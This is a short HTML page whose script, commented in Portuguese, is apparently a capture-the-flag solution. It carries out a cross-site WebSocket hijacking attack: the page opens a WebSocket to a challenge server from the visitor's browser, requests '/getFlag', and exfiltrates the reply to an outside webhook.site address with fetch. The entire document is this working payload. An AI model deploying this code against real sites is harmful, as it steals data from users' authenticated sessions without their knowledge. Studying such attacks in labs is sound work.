<!DOCTYPE html>

<script>
(async () => {
  // 1) Conecta ao WebSocket do desafio
  const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
  ws.onopen = () => {
    // 2) Pede a flag
    ws.send(JSON.stringify({sender:'user', message:'/getFlag'}));
  };
  ws.onmessage = async (e) => {
    const data = JSON.parse(e.data);
      // 3) Exfiltra para seu webhook
      await fetch('https://60ceeedd-4d07-4620-94b4-d916596ae4d6.webhook.site/?flag=' +
                  encodeURIComponent(data.message));
  };
})();
</script>
